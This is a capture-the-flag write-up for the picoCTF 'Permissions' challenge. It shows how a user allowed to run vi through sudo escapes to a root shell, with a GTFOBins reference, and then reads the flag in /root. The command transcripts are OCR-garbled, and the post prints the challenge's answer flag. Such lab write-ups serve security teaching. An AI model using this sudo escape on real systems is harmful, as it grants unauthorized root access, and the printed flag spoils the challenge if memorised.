# Permissions
> Can you read files in the root file?

## About the Challenge
We were given an access to SSH server and then we need to read the flag in the `root` directory

## How to Solve?
If we check the `sudo` configuration


[Image extracted text: picoplayer@challenge:~$ sudo
[sudo]
password
for
picoplayer
Matching Defaults entries
for picoplayer
challenge:
env_reset,
mail_badpass,
secure_
path-/usr/local/sbin| : /usr
User picoplayer
may
run the
following commands
on
challenge:
(ALL) /usr/bingvi]


There are only 1 commands that we can use, `/usr/bin/vi`. In this case we will be using `/usr/bin/vi` command to do privilege escalation (Im using [GTFOBins](https://gtfobins.github.io/gtfobins/vi/#sudo) to do privilege escalation)


[Image extracted text: picoplayer@challenge:~$
sudo vi
Ibin/bash
Idev/null
root@challenge: /home/picoplayer# whoami
root
root@challenge: /home/picoplayer#]


And then go to `/root` directory and read `.flag.txt` to obtain the flag


[Image extracted text: root@challenge
/home/picoplayer#
Iroot
root@challenge:~# Is
root@challenge:~# Is
~la
total 12
drwx
root
root
23 Mar 16 02:29
drwxr-xr-X 1
root
root
51
Mar 28 16.45
~rW-r--r
root
root 3106
Dec
2019
bashrc
~rW-r--r_
root
root
35
Mar 16 02:29
txt
~rW-r-
root
root
161
Dec
2019
profile
root@challenge:~# cat
txt
picoCTF{uSlng_
vIm
3ditor_55878651}
flag
flag _]


```
picoCTF{uS1ng_v1m_3dit0r_55878b51}
```